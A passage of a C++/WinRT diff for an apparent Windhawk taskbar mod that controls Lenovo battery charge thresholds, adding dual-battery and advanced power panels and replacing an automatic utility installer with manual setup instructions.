+  scroll.VerticalScrollBarVisibility(C::ScrollBarVisibility::Auto);
+  scroll.HorizontalScrollBarVisibility(C::ScrollBarVisibility::Disabled);
+  RECT bar{};
+  MONITORINFO mi{sizeof(mi)};
+  GetWindowRect(FindWindowW(L"Shell_TrayWnd", nullptr), &bar);
+  if (GetMonitorInfoW(MonitorFromRect(&bar, MONITOR_DEFAULTTONEAREST), &mi)) {
+    double scale = target.XamlRoot().RasterizationScale();
+    scroll.MaxHeight((std::max)(120.0, (mi.rcWork.bottom - mi.rcWork.top) / scale - 64));
+    content.Width((std::min)(390.0, (mi.rcWork.right - mi.rcWork.left) / scale - 64));
+  }
+  SetPanelContent(scroll, target);
+  flyout.Placement(P::FlyoutPlacementMode::Top);
+  TrackEvent(flyout.Opened(winrt::auto_revoke, SafeUi([weak = winrt::make_weak(target)](
+                                                          auto const& sender, auto const&) {
+                             if (auto t = weak.get())
+                               PositionPanel(t, sender.template as<C::Flyout>());
+                           })));
+  ShowPanelHost(target);
+}
+void ShowAdvanced(FrameworkElement target) {
+  if (unloading || !target || !target.XamlRoot())
+    return;
+  Close();
+  C::StackPanel content;
+  content.Width(390);
+  content.Spacing(14);
+  content.Children().Append(Text(L"Advanced power controls", 22));
+  C::StackPanel body;
+  body.Spacing(12);
+  C::StackPanel tabs;
+  tabs.Orientation(C::Orientation::Horizontal);
+  tabs.Spacing(6);
+  int index = 0;
+  for (auto label : {L"Battery health", L"Power", L"Calibration"}) {
+    P::ToggleButton tab;
+    tab.Content(winrt::box_value(label));
+    tab.IsChecked(index == advancedTab);
+    TrackEvent(
+        tab.Click(winrt::auto_revoke, SafeUi([target, body, index](auto const&, auto const&) {
+                    advancedTab = index;
+                    RenderAdvanced(body, target);
+                  })));
+    tabs.Children().Append(tab);
+    index++;
+  }
+  content.Children().Append(tabs);
+  content.Children().Append(body);
+  C::Button refresh;
+  refresh.Content(winrt::box_value(L"Refresh"));
+  TrackEvent(refresh.Click(winrt::auto_revoke, SafeUi([body](auto const&, auto const&) {
+                             body.Children().Clear();
+                             body.Children().Append(Text(L"Checking supported features..."));
+                             Send(20);
+                           })));
+  content.Children().Append(refresh);
+  body.Children().Append(Text(L"Checking supported features..."));
+  auto revision = std::make_shared<ULONGLONG>(BatteryControls::AdvancedControls::Read().revision);
+  statusTimer = DispatcherTimer();
+  statusTimer.Interval(std::chrono::milliseconds(200));
+  TrackEvent(statusTimer.Tick(winrt::auto_revoke,
+                              SafeUi([body, target, revision](auto const&, auto const&) {
+                                auto next = BatteryControls::AdvancedControls::Read().revision;
+                                if (next != *revision) {
+                                  *revision = next;
+                                  RenderAdvanced(body, target);
+                                }
+                              })));
+  statusTimer.Start();
+  PresentContent(target, content);
+  TrackEvent(flyout.Closed(winrt::auto_revoke, SafeUi([](auto const&, auto const&) {
+                             if (statusTimer)
+                               statusTimer.Stop();
+                           })));
+  Send(20);
+}
+struct DualDraft {
+  bool valid = false, linked = false;
+  int selected = 0;
+  BatteryControls::Pack packs[2]{};
+};
+DualDraft dualDraft;
+void ShowDualPanel(FrameworkElement target) {
+  Close();
+  auto state = BatteryControls::ReadSnapshot().state;
+  if (!dualDraft.valid) {
+    dualDraft.valid = true;
+    dualDraft.selected = 0;
+    dualDraft.linked = !state.mixed;
+    std::copy(std::begin(state.packs), std::end(state.packs), dualDraft.packs);
+  }
+  C::StackPanel content;
+  content.Width(390);
+  content.Spacing(12);
+  content.Children().Append(Text(L"Battery protection", 22));
+  content.Children().Append(Text(L"Choose each battery's range. Apply saves both.", 12));
+  if (!BatteryControls::IntegratedBackend()) {
+    content.Children().Append(
+        Text(L"Separate battery ranges require Integrated Lenovo service. Select it in Windhawk "
+             L"Settings."));
+    PresentContent(target, content);
+    return;
+  }
+  C::ToggleSwitch linked;
+  linked.Header(winrt::box_value(L"Use the same limits"));
+  linked.IsOn(dualDraft.linked);
+  content.Children().Append(linked);
+  C::StackPanel cards;
+  cards.Orientation(C::Orientation::Horizontal);
+  cards.Spacing(8);
+  P::ToggleButton first, second;
+  first.Width(180);
+  second.Width(180);
+  cards.Children().Append(first);
+  cards.Children().Append(second);
+  content.Children().Append(cards);
+  C::TextBlock editing;
+  content.Children().Append(editing);
+  C::ToggleSwitch enabled;
+  enabled.Header(winrt::box_value(L"Limit charging"));
+  content.Children().Append(enabled);
+  C::TextBlock startLabel, stopLabel, summary;
+  C::Slider start, stop;
+  start.Minimum(5);
+  start.Maximum(99);
+  stop.Minimum(6);
+  stop.Maximum(100);
+  start.StepFrequency(1);
+  stop.StepFrequency(1);
+  Automation::AutomationProperties::SetName(start, L"Start charging below percentage");
+  Automation::AutomationProperties::SetName(stop, L"Stop charging at percentage");
+  auto adjusting = std::make_shared<bool>(false);
+  auto selections = std::make_shared<std::vector<std::tuple<P::ToggleButton, int, int>>>();
+  auto render = [=]() {
+    *adjusting = true;
+    auto p = dualDraft.packs[dualDraft.selected];
+    enabled.IsOn(p.enabled);
+    start.Value(BatteryControls::ValidRange(p.start, p.stop) ? p.start : 75);
+    stop.Value(BatteryControls::ValidRange(p.start, p.stop) ? p.stop : 80);
+    auto range = [](auto p) {
+      return p.enabled ? std::to_wstring(p.start) + L" to " + std::to_wstring(p.stop) + L"%"
+                       : L"Limits off";
+    };
+    first.Content(winrt::box_value(L"Battery 1\n" + range(dualDraft.packs[0])));
+    second.Content(winrt::box_value(L"Battery 2\n" + range(dualDraft.packs[1])));
+    first.IsChecked(dualDraft.selected == 0);
+    second.IsChecked(dualDraft.selected == 1);
+    editing.Text(dualDraft.linked ? L"Both batteries"
+                                  : L"Battery " + std::to_wstring(dualDraft.selected + 1));
+    startLabel.Text(L"Start below " + std::to_wstring(int(start.Value())) + L"%");
+    stopLabel.Text(L"Stop at " + std::to_wstring(int(stop.Value())) + L"%");
+    summary.Text(L"Battery 1: " + range(dualDraft.packs[0]) + L"\nBattery 2: " +
+                 range(dualDraft.packs[1]));
+    for (auto& [button, a, b] : *selections)
+      button.IsChecked(p.enabled && p.start == a && p.stop == b);
+    *adjusting = false;
+  };
+  auto update = [=](bool changedStart) {
+    if (*adjusting)
+      return;
+    int a = int(start.Value()), b = int(stop.Value());
+    if (a >= b) {
+      if (changedStart)
+        b = a + 1;
+      else
+        a = b - 1;
+    }
+    auto& p = dualDraft.packs[dualDraft.selected];
+    p = {1, DWORD(enabled.IsOn()), a, b};
+    if (dualDraft.linked)
+      dualDraft.packs[1 - dualDraft.selected] = p;
+    render();
+  };
+  TrackEvent(first.Click(winrt::auto_revoke, SafeUi([render](auto const&, auto const&) {
+                           dualDraft.selected = 0;
+                           render();
+                         })));
+  TrackEvent(second.Click(winrt::auto_revoke, SafeUi([render](auto const&, auto const&) {
+                            dualDraft.selected = 1;
+                            render();
+                          })));
+  TrackEvent(linked.Toggled(winrt::auto_revoke, SafeUi([linked, render](auto const&, auto const&) {
+                              dualDraft.linked = linked.IsOn();
+                              if (dualDraft.linked)
+                                dualDraft.packs[1 - dualDraft.selected] =
+                                    dualDraft.packs[dualDraft.selected];
+                              render();
+                            })));
+  C::StackPanel choices;
+  choices.Spacing(4);
+  for (auto preset : ReadPresets())
+    if (preset.quick) {
+      P::ToggleButton button;
+      selections->emplace_back(button, preset.start, preset.stop);
+      button.Content(PresetDisplay(preset));
+      button.HorizontalAlignment(HorizontalAlignment::Stretch);
+      button.HorizontalContentAlignment(HorizontalAlignment::Stretch);
+      TrackEvent(button.Click(
+          winrt::auto_revoke, SafeUi([preset, render](auto const&, auto const&) {
+            dualDraft.packs[dualDraft.selected] = {1, 1, preset.start, preset.stop};
+            if (dualDraft.linked)
+              dualDraft.packs[1 - dualDraft.selected] = dualDraft.packs[dualDraft.selected];
+            render();
+          })));
+      choices.Children().Append(button);
+    }
+  C::ScrollViewer presets;
+  presets.Content(choices);
+  presets.MaxHeight(150);
+  presets.VerticalScrollBarVisibility(C::ScrollBarVisibility::Auto);
+  content.Children().Append(presets);
+  content.Children().Append(startLabel);
+  content.Children().Append(start);
+  content.Children().Append(stopLabel);
+  content.Children().Append(stop);
+  TrackEvent(start.ValueChanged(winrt::auto_revoke,
+                                SafeUi([update](auto const&, auto const&) { update(true); })));
+  TrackEvent(stop.ValueChanged(winrt::auto_revoke,
+                               SafeUi([update](auto const&, auto const&) { update(false); })));
+  TrackEvent(enabled.Toggled(winrt::auto_revoke,
+                             SafeUi([update](auto const&, auto const&) { update(true); })));
+  render();
+  C::Button manage;
+  manage.Content(winrt::box_value(L"Manage presets..."));
+  TrackEvent(manage.Click(winrt::auto_revoke, SafeUi([target](auto const&, auto const&) {
+                            presetReturnView = 0;
+                            QueuePanel(target, 2);
+                          })));
+  content.Children().Append(manage);
+  C::Button save;
+  save.Content(winrt::box_value(L"+ Save selected range as preset..."));
+  save.IsEnabled(ReadPresets().size() < maxPresets);
+  TrackEvent(save.Click(winrt::auto_revoke, SafeUi([target](auto const&, auto const&) {
+                          auto p = dualDraft.packs[dualDraft.selected];
+                          addPresetDraft = {true, bool(p.enabled), p.start, p.stop};
+                          presetReturnView = 0;
+                          QueuePanel(target, 2);
+                        })));
+  content.Children().Append(save);
+  summary.FontSize(12);
+  content.Children().Append(summary);
+  content.Children().Append(
+      Text(L"Above the limit? The level may fall slowly while plugged in. Unplug to reach your "
+           L"selected range sooner.",
+           12));
+  C::StackPanel actions;
+  actions.Orientation(C::Orientation::Horizontal);
+  actions.Spacing(8);
+  C::Button apply, cancel;
+  apply.Content(winrt::box_value(L"Apply both ranges"));
+  cancel.Content(winrt::box_value(L"Cancel"));
+  TrackEvent(apply.Click(winrt::auto_revoke, SafeUi([](auto const&, auto const&) {
+                           unsigned value = 0;
+                           for (int i = 0; i < 2; i++) {
+                             auto p = dualDraft.packs[i];
+                             if (p.enabled)
+                               value |= (unsigned(p.start) | (unsigned(p.stop) << 8)) << (i * 16);
+                           }
+                           Send(24, int(value));
+                           dualDraft.valid = false;
+                           flyout.Hide();
+                         })));
+  TrackEvent(cancel.Click(winrt::auto_revoke, SafeUi([](auto const&, auto const&) {
+                            dualDraft.valid = false;
+                            flyout.Hide();
+                          })));
+  actions.Children().Append(apply);
+  actions.Children().Append(cancel);
+  content.Children().Append(actions);
+  PresentContent(target, content);
+}
+
 void ShowPanel(FrameworkElement target) {
+  auto dualState = BatteryControls::ReadSnapshot().state;
+  if (dualState.packs[0].present && dualState.packs[1].present) {
+    ShowDualPanel(target);
+    return;
+  }
   if (unloading || !target || !target.XamlRoot())
     return;
   Close();
@@ -2297,7 +3159,8 @@ void ShowPanel(FrameworkElement target) {
   panel = std::make_shared<Panel>();
   auto p = panel;
   std::weak_ptr<Panel> weak = p;
-  flyout = C::Flyout();
+  if (!preservePanelHost || !flyout)
+    flyout = C::Flyout();
   flyout.ShouldConstrainToRootBounds(false);
   C::StackPanel content;
   content.Width(340);
@@ -2306,6 +3169,22 @@ void ShowPanel(FrameworkElement target) {
   title.FontWeight(winrt::Windows::UI::Text::FontWeights::SemiBold());
   content.Children().Append(title);
   content.Children().Append(Text(L"Choose when charging starts and stops."));
+  auto batteryState = BatteryControls::ReadSnapshot().state;
+  if (batteryState.packs[0].present && batteryState.packs[1].present)
+    content.Children().Append(Text(
+        L"Changes apply to both batteries. Charge to full saves each battery's limits separately.",
+        12));
+  if (batteryState.mixed) {
+    for (int i = 0; i < 2; i++)
+      if (batteryState.packs[i].present) {
+        auto& pack = batteryState.packs[i];
+        content.Children().Append(Text(L"Battery " + std::to_wstring(i + 1) + L": " +
+                                           (pack.enabled ? std::to_wstring(pack.start) + L" to " +
+                                                               std::to_wstring(pack.stop) + L"%"
+                                                         : L"limits off"),
+                                       12));
+      }
+  }
   p->enabled.Header(winrt::box_value(L"Limit charging"));
   p->enabled.IsOn(initial.enabled || BatteryControls::Active());
   content.Children().Append(p->enabled);
@@ -2503,7 +3382,7 @@ void ShowPanel(FrameworkElement target) {
     scroll.MaxHeight((std::max)(120.0, (mi.rcWork.bottom - mi.rcWork.top) / scale - 64));
     content.Width((std::min)(340.0, (mi.rcWork.right - mi.rcWork.left) / scale - 64));
   }
-  flyout.Content(scroll);
+  SetPanelContent(scroll, target);
   flyout.Placement(P::FlyoutPlacementMode::Top);
   TrackEvent(flyout.Opened(winrt::auto_revoke, SafeUi([weakTarget = winrt::make_weak(target)](
                                                           auto const& sender, auto const&) {
@@ -2514,7 +3393,7 @@ void ShowPanel(FrameworkElement target) {
                                BatteryControls::Status(L"Unable to display battery controls.");
                              }
                            })));
-  flyout.ShowAt(target);
+  ShowPanelHost(target);
 }
 std::wstring MachineValue(PCWSTR name) {
   wchar_t text[256]{};
@@ -2524,7 +3403,6 @@ std::wstring MachineValue(PCWSTR name) {
     return L"Unknown";
   return text;
 }
-// BEGIN TESTABLE MODEL LINK
 std::wstring LenovoMachineType(bool lenovo, const std::wstring& model) {
   if (!lenovo || model.size() < 4 || model.size() > 20)
     return {};
@@ -2547,12 +3425,12 @@ std::wstring LenovoDriverUrl(const std::wstring& type) {
     return L"https://pcsupport.lenovo.com/";
   return L"https://pcsupport.lenovo.com/us/en/products/" + type + L"/downloads/driver-list";
 }
-// END TESTABLE MODEL LINK
 void ShowSetup(FrameworkElement target) {
   if (unloading || !target || !target.XamlRoot())
     return;
   Close();
-  flyout = C::Flyout();
+  if (!preservePanelHost || !flyout)
+    flyout = C::Flyout();
   flyout.ShouldConstrainToRootBounds(false);
   C::StackPanel content;
   content.Width(340);
@@ -2570,69 +3448,26 @@ void ShowSetup(FrameworkElement target) {
     content.Children().Append(
         Text(L"A Lenovo manufacturer could not be confirmed. This mod requires compatible Lenovo "
              L"hardware."));
+  bool integrated = BatteryControls::IntegratedBackend();
   content.Children().Append(
-      Text(L"Default utility location: " + BatteryControls::DefaultUtility(), 12));
-  bool ready =
-      BatteryControls::UiInt(L"cacheValid", 0) && BatteryControls::UiInt(L"utilityCheck", 0) == 4;
-  auto setupFeedback = Text(ready ? L"Lenovo utility is ready. No setup is needed."
-                                  : L"Set up the Lenovo utility below.");
-  content.Children().Append(setupFeedback);
-  C::Button setup;
-  setup.Content(
-      winrt::box_value(ready ? L"Run setup again" : L"Download and set up Lenovo utility"));
-  TrackEvent(setup.Click(
-      winrt::auto_revoke,
-      SafeUi([setupFeedback, weakSetup = winrt::make_weak(setup)](auto const&, auto const&) {
-        auto setup = weakSetup.get();
-        if (!setup)
-          return;
-        setupFeedback.Text(
-            L"Windows may ask you to approve Windows Command Processor, published by Microsoft, to "
-            L"install the Lenovo utility.");
-        setup.IsEnabled(false);
-        BatteryControls::SetupStatus(L"Setup requested...");
-        Send(7, 1);
-        if (statusTimer)
-          statusTimer.Stop();
-        statusTimer = DispatcherTimer();
-        statusTimer.Interval(std::chrono::milliseconds(500));
-        TrackEvent(statusTimer.Tick(
-            winrt::auto_revoke, SafeUi([setupFeedback, weakSetup](auto const&, auto const&) {
-              auto setup = weakSetup.get();
-              if (!setup)
-                return;
-              auto result = BatteryControls::SetupText();
-              setupFeedback.Text(result);
-              bool busy = BatteryControls::setupRunning.load() || result == L"Starting setup..." ||
-                          result == L"Setup requested...";
-              if (!busy) {
-                setup.IsEnabled(true);
-                if (statusTimer)
-                  statusTimer.Stop();
-              }
-            })));
-        statusTimer.Start();
-      })));
-  content.Children().Append(setup);
-  TrackEvent(flyout.Closed(winrt::auto_revoke, SafeUi([](auto const&, auto const&) {
-                             if (statusTimer)
-                               statusTimer.Stop();
-                           })));
-  content.Children().Append(Text(
-      L"Downloads the reviewed utility directly from Lenovo, verifies it, and installs it in "
-      L"Program Files. Windows asks for administrator approval. Leave the utility path blank in "
-      L"Windhawk Settings to use this location.",
-      12));
-  int utility = BatteryControls::UiInt(L"utilityCheck", 0);
-  content.Children().Append(Text(
-      utility == 4 ? L"ChargeThreshold utility: verified."
-      : utility == 1
-          ? L"Action needed: set the full ChargeThreshold.exe path in this mod's Windhawk Settings."
-      : utility == 2 ? L"Action needed: the configured utility file is missing or inaccessible. "
-                       L"Download it and update its path in Windhawk Settings."
-      : utility == 3 ? L"Action needed: the utility is missing, unverified, or in a writable "
-                       L"location. Use Download and set up above, and leave the path setting blank."
-                     : L"Utility check has not completed. Reopen this panel shortly."));
+      Text(integrated ? L"Backend: integrated Lenovo service. No utility download is needed."
+                      : L"Backend: Lenovo ChargeThreshold.exe."));
+  content.Children().Append(
+      Text(L"Choose the charging backend in this mod's Windhawk Settings.", 12));
+  if (!integrated) {
+    content.Children().Append(
+        Text(L"Download Lenovo's utility using the link below, save it in a folder of your choice, "
+             L"and set its full path in this mod's Windhawk Settings.",
+             12));
+    auto path = BatteryControls::UtilityPath();
+    content.Children().Append(
+        Text(path.empty() ? L"Utility path: not configured." : L"Utility path: " + path, 12));
+    content.Children().Append(Text(BatteryControls::ReadSnapshot().utility == 4
+                                       ? L"Utility: verified."
+                                       : L"Utility has not been verified. Check the path and "
+                                         L"download the linked Lenovo version.",
+                                   12));
+  }
   SC_HANDLE manager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
   std::wstring service = L"Lenovo PM Service: status could not be checked.";
   if (manager) {
@@ -2652,7 +3487,17 @@ void ShowSetup(FrameworkElement target) {
     CloseServiceHandle(manager);
   }
   content.Children().Append(Text(service));
-  bool valid = BatteryControls::UiInt(L"cacheValid", 0);
+  auto current = BatteryControls::ReadSnapshot().state;
+  for (int i = 0; i < 2; i++)
+    if (current.packs[i].present) {
+      const auto& pack = current.packs[i];
+      content.Children().Append(Text(L"Battery " + std::to_wstring(i + 1) + L": " +
+                                         (pack.enabled ? std::to_wstring(pack.start) + L" to " +
+                                                             std::to_wstring(pack.stop) + L"%"
+                                                       : L"limits off"),
+                                     12));
+    }
+  bool valid = (BatteryControls::ReadSnapshot().state.valid && !BatteryControls::refreshing);
   content.Children().Append(Text(
       valid ? L"Battery communication: working."
             : L"Battery communication: unavailable. This can mean missing drivers, a stopped "
@@ -2682,12 +3527,13 @@ void ShowSetup(FrameworkElement target) {
         L"The machine type could not be identified. Use Lenovo Support below to select your model.",
         12));
   link(L"Find your model on Lenovo Support", L"https://pcsupport.lenovo.com/");
-  content.Children().Append(Text(
-      L"Check supported models before installing a driver. If Lenovo cannot resolve the link, "
-      L"select your model on its support site. The setup button installs only the utility after "
-      L"administrator approval (Windows Command Processor, Microsoft); drivers must be "
-      L"installed separately. Links open only when clicked. No serial number is read or sent.",
-      12));
+  content.Children().Append(
+      Text(L"Check supported models before installing a driver. If Lenovo cannot resolve the link, "
+           L"select your model on its support site. Download the utility manually and set its path "
+           L"in Windhawk Settings. "
+           L"Drivers must be "
+           L"installed separately. Links open only when clicked. No serial number is read or sent.",
+           12));
   C::ScrollViewer scroll;
   scroll.Content(content);
   scroll.VerticalScrollBarVisibility(C::ScrollBarVisibility::Auto);
@@ -2701,7 +3547,7 @@ void ShowSetup(FrameworkElement target) {
                                           target.XamlRoot().RasterizationScale() -
                                       64);
   scroll.MaxHeight(available);
-  flyout.Content(scroll);
+  SetPanelContent(scroll, target);
   flyout.Placement(P::FlyoutPlacementMode::Top);
   TrackEvent(flyout.Opened(winrt::auto_revoke, SafeUi([weak = winrt::make_weak(target)](
                                                           auto const& sender, auto const&) {
@@ -2712,35 +3558,38 @@ void ShowSetup(FrameworkElement target) {
                                BatteryControls::Status(L"Unable to display battery controls.");
                              }
                            })));
-  flyout.ShowAt(target);
+  ShowPanelHost(target);
 }
 void QueuePanel(FrameworkElement target, int view) {
-  if (unloading)
+  if (unloading || !target || !target.XamlRoot())
     return;
-  Close();
-  pendingMenu = DispatcherTimer();
-  pendingMenu.Interval(std::chrono::milliseconds(50));
-  TrackEvent(pendingMenu.Tick(
-      winrt::auto_revoke, SafeUi([weak = winrt::make_weak(target), view](auto const&, auto const&) {
-        if (auto target = weak.get()) {
-          if (view == 3)
-            ShowQuickMenu(target);
-          else if (view == 2)
-            ShowPresetEditor(target);
-          else if (view == 1)
-            ShowSetup(target);
-          else
-            ShowPanel(target);
-        } else
-          Close();
-      })));
-  pendingMenu.Start();
+  preservePanelHost = flyout && flyout.IsOpen() && view != 3 && view != -1;
+  try {
+    if (view == -1)
+      ShowMenu(target);
+    else if (view == 4)
+      ShowAdvanced(target);
+    else if (view == 3)
+      ShowQuickMenu(target);
+    else if (view == 2)
+      ShowPresetEditor(target);
+    else if (view == 1)
+      ShowSetup(target);
+    else
+      ShowPanel(target);
+  } catch (...) {
+    preservePanelHost = false;
+    Close();
+    throw;
+  }
+  preservePanelHost = false;
 }
 void MarkApplied(C::MenuFlyoutItem item, const Preset& preset) {
-  if (MatchesPreset(preset, BatteryControls::UiInt(L"cacheValid", 0),
-                    BatteryControls::UiInt(L"cacheEnabled", 0), BatteryControls::Active(),
-                    BatteryControls::UiInt(L"cacheStart", 0),
-                    BatteryControls::UiInt(L"cacheStop", 0))) {
+  if (MatchesPreset(preset,
+                    (BatteryControls::ReadSnapshot().state.valid && !BatteryControls::refreshing),
+                    BatteryControls::ReadSnapshot().state.enabled, BatteryControls::Active(),
+                    BatteryControls::ReadSnapshot().state.start,
+                    BatteryControls::ReadSnapshot().state.stop)) {
     C::FontIcon icon;
     icon.Glyph(L"\uE73E");
     item.Icon(icon);
@@ -2756,8 +3605,8 @@ void ShowMenu(FrameworkElement target) {
   const wchar_t* fullLabel = ac == 0   ? L"Charge to full when plugged in"
                              : ac == 1 ? L"Charge to full now"
                                        : L"Charge to full";
-  bool valid = BatteryControls::UiInt(L"cacheValid", 0),
-       enabled = BatteryControls::UiInt(L"cacheEnabled", 0), active = BatteryControls::Active();
+  bool valid = (BatteryControls::ReadSnapshot().state.valid && !BatteryControls::refreshing),
+       enabled = BatteryControls::ReadSnapshot().state.enabled, active = BatteryControls::Active();
   auto add = [&](std::wstring text, wchar_t glyph, bool enabled, auto callback) {
     C::MenuFlyoutItem item;
     item.Text(text);
@@ -2771,10 +3620,11 @@ void ShowMenu(FrameworkElement target) {
     return item;
   };
   std::wstring status =
-      active    ? L"Charge to 100% (temporary)"
-      : !valid  ? L"Charging status unavailable"
-      : enabled ? L"Charge: " + std::to_wstring(BatteryControls::UiInt(L"cacheStart", 75)) +
-                      L" to " + std::to_wstring(BatteryControls::UiInt(L"cacheStop", 80)) + L"%"
+      active                                        ? L"Charge to 100% (temporary)"
+      : !valid                                      ? L"Charging status unavailable"
+      : BatteryControls::ReadSnapshot().state.mixed ? L"Different battery limits"
+      : enabled ? L"Charge: " + std::to_wstring(BatteryControls::ReadSnapshot().state.start) +
+                      L" to " + std::to_wstring(BatteryControls::ReadSnapshot().state.stop) + L"%"
                 : L"Charge to 100% (limits off)";
   C::MenuFlyoutItem header;
   header.Text(status);
@@ -2848,8 +3698,13 @@ void ShowMenu(FrameworkElement target) {
   quick.Items().Append(managePresets);
   menu.Items().Append(quick);
   menu.Items().Append(C::MenuFlyoutSeparator());
-  auto threshold = add(L"Set charge threshold...", L'\uE9E9', valid,
-                       [target](auto const&, auto const&) { QueuePanel(target, false); });
+  auto threshold =
+      add(L"Set charge threshold...", L'\uE9E9', valid, [target](auto const&, auto const&) {
+        dualDraft.valid = false;
+        QueuePanel(target, false);
+      });
+  add(L"Advanced power controls...", L'\uE9D9', true,
+      [target](auto const&, auto const&) { QueuePanel(target, 4); });
   add(L"Windows battery settings", L'\uE8A5', true, [](auto const&, auto const&) { Send(4); });
   auto update = [header, full, threshold, quickItems, fullLabel = std::wstring(fullLabel)]() {
     auto snap = BatteryControls::ReadSnapshot();
@@ -2858,6 +3713,7 @@ void ShowMenu(FrameworkElement target) {
     std::wstring text = waiting              ? L"Checking charging..."
                         : active             ? L"Charge to 100% (temporary)"
                         : !valid             ? L"Charging status unavailable"
+                        : snap.state.mixed   ? L"Different battery limits"
                         : snap.state.enabled ? L"Charge: " + std::to_wstring(snap.state.start) +
                                                    L" to " + std::to_wstring(snap.state.stop) + L"%"
                                              : L"Charge to 100% (limits off)";
@@ -2907,7 +3763,7 @@ void ShowQuickMenu(FrameworkElement target) {
   heading.IsEnabled(false);
   menu.Items().Append(heading);
   std::vector<std::pair<C::MenuFlyoutItem, Preset>> quickItems;
-  bool valid = BatteryControls::UiInt(L"cacheValid", 0);
+  bool valid = (BatteryControls::ReadSnapshot().state.valid && !BatteryControls::refreshing);
   int shown = 0;
   for (const auto& preset : ReadPresets()) {
     if (!preset.quick || shown++ >= 5)
@@ -2934,20 +3790,21 @@ void ShowQuickMenu(FrameworkElement target) {
   statusTimer = DispatcherTimer();
   statusTimer.Interval(std::chrono::milliseconds(200));
   auto stamp = std::make_shared<ULONGLONG>(~0ULL);
-  TrackEvent(
-      statusTimer.Tick(winrt::auto_revoke, SafeUi([quickItems, stamp](auto const&, auto const&) {
-                         auto snap = BatteryControls::ReadSnapshot();
-                         auto current = snap.revision * 4 + (BatteryControls::refreshing ? 2 : 0) +
-                                        (BatteryControls::Active() ? 1 : 0);
-                         if (current == *stamp)
-                           return;
-                         *stamp = current;
-                         for (auto& [item, preset] : quickItems) {
-                           item.IsEnabled(BatteryControls::UiInt(L"cacheValid", 0));
-                           item.Icon(nullptr);
-                           MarkApplied(item, preset);
-                         }
-                       })));
+  TrackEvent(statusTimer.Tick(
+      winrt::auto_revoke, SafeUi([quickItems, stamp](auto const&, auto const&) {
+        auto snap = BatteryControls::ReadSnapshot();
+        auto current = snap.revision * 4 + (BatteryControls::refreshing ? 2 : 0) +
+                       (BatteryControls::Active() ? 1 : 0);
+        if (current == *stamp)
+          return;
+        *stamp = current;
+        for (auto& [item, preset] : quickItems) {
+          item.IsEnabled(
+              (BatteryControls::ReadSnapshot().state.valid && !BatteryControls::refreshing));
+          item.Icon(nullptr);
+          MarkApplied(item, preset);
+        }
+      })));
   statusTimer.Start();
   TrackEvent(menu.Closed(winrt::auto_revoke, SafeUi([](auto const&, auto const&) {
                            if (statusTimer)
@@ -2971,7 +3828,7 @@ void QueueMenu(FrameworkElement target) {
                                   else
                                     Close();
                                 } catch (winrt::hresult_error const& e) {
-                                  Engine::SetString(L"uiError", e.message().c_str());
+                                  Wh_Log(L"uiError: %s", e.message().c_str());
                                   Close();
                                 }
                               })));
@@ -2981,9 +3838,10 @@ void QueueMenu(FrameworkElement target) {
 
 struct NativeBinding {
   winrt::weak_ref<UIElement> element;
-  winrt::Windows::Foundation::IInspectable handler;
+  winrt::event_token token;
+  winrt::Windows::Foundation::IInspectable rightHandler, keyHandler;
 };
-std::vector<NativeBinding> bindings;
+[[clang::no_destroy]] std::optional<std::vector<NativeBinding>> bindings{std::in_place};
 std::atomic<HWND> taskbar = nullptr;
 void Scan(DependencyObject node, int depth = 0) {
   if (unloading || !node || depth > 128)
@@ -2998,26 +3856,63 @@ void Scan(DependencyObject node, int depth = 0) {
       }
       ancestor = Media::VisualTreeHelper::GetParent(ancestor);
     }
-    for (auto& binding : bindings)
+    for (auto& binding : *bindings)
       if (binding.element.get() == element)
         return;
-    Input::RightTappedEventHandler handler = [](auto const& sender,
-                                                Input::RightTappedRoutedEventArgs const& args) {
+    auto lastRequest = std::make_shared<ULONGLONG>(0);
+    auto show = [lastRequest](FrameworkElement target) {
       if (unloading)
         return;
-      args.Handled(true);
+      auto now = GetTickCount64();
+      if (now - *lastRequest < 120)
+        return;
+      *lastRequest = now;
+      ModernUI::QueueMenu(target);
+    };
+    winrt::Windows::Foundation::TypedEventHandler<UIElement, Input::ContextRequestedEventArgs>
+        context = [show](auto const& sender, Input::ContextRequestedEventArgs const& args) {
+          if (unloading)
+            return;
+          try {
+            show(sender.template as<FrameworkElement>());
+            args.Handled(true);
+          } catch (...) {
+            BatteryControls::Status(L"Unable to display battery controls.");
+          }
+        };
+    // Explorer can mark pointer/key routed events handled before ContextRequested fires.
+    // Keep handled-events-too routes alongside the accessibility context request.
+    Input::RightTappedEventHandler right = [show](auto const& sender, auto const& args) {
+      if (unloading)
+        return;
       try {
-        ModernUI::QueueMenu(sender.template as<FrameworkElement>());
+        show(sender.template as<FrameworkElement>());
+        args.Handled(true);
       } catch (...) {
         BatteryControls::Status(L"Unable to display battery controls.");
       }
     };
-    auto boxed = winrt::box_value(handler);
-    element.AddHandler(UIElement::RightTappedEvent(), boxed, true);
-    bindings.push_back({winrt::make_weak(element.as<UIElement>()), boxed});
-    Engine::Log(L"Native battery context menu attached");
-    Engine::SetInt(L"nativeAttached", 1);
-    Engine::SetString(L"attachedVersion", L"0.6.6");
+    Input::KeyEventHandler key = [show](auto const& sender, auto const& args) {
+      if (unloading)
+        return;
+      int k = int(args.Key());
+      if (k != VK_APPS && !(k == VK_F10 && (GetKeyState(VK_SHIFT) & 0x8000)))
+        return;
+      try {
+        show(sender.template as<FrameworkElement>());
+        args.Handled(true);
+      } catch (...) {
+        BatteryControls::Status(L"Unable to display battery controls.");
+      }
+    };
+    auto token = element.ContextRequested(context);
+    auto rightBox = winrt::box_value(right), keyBox = winrt::box_value(key);
+    element.AddHandler(UIElement::RightTappedEvent(), rightBox, true);
+    element.AddHandler(UIElement::KeyDownEvent(), keyBox, true);
+    bindings->push_back({winrt::make_weak(element.as<UIElement>()), token, rightBox, keyBox});
+    Wh_Log(L"Native battery context menu attached");
+    Wh_Log(L"nativeAttached=%d", int(1));
+    Wh_Log(L"attachedVersion: %s", WH_MOD_VERSION);
     return;
   }
   for (int i = 0; i < Media::VisualTreeHelper::GetChildrenCount(node); i++)
@@ -3038,15 +3933,18 @@ void AttachNativeMenu() {
           return;
         try {
           // Most checks stop here: no full-tree traversal while the binding lives.
-          for (auto& binding : bindings)
+          for (auto& binding : *bindings)
             if (auto e = binding.element.get())
               if (auto f = e.try_as<FrameworkElement>())
                 if (f.XamlRoot())
                   return;
-          for (auto& binding : bindings)
-            if (auto e = binding.element.get())
-              e.RemoveHandler(UIElement::RightTappedEvent(), binding.handler);
-          bindings.clear();
+          for (auto& binding : *bindings)
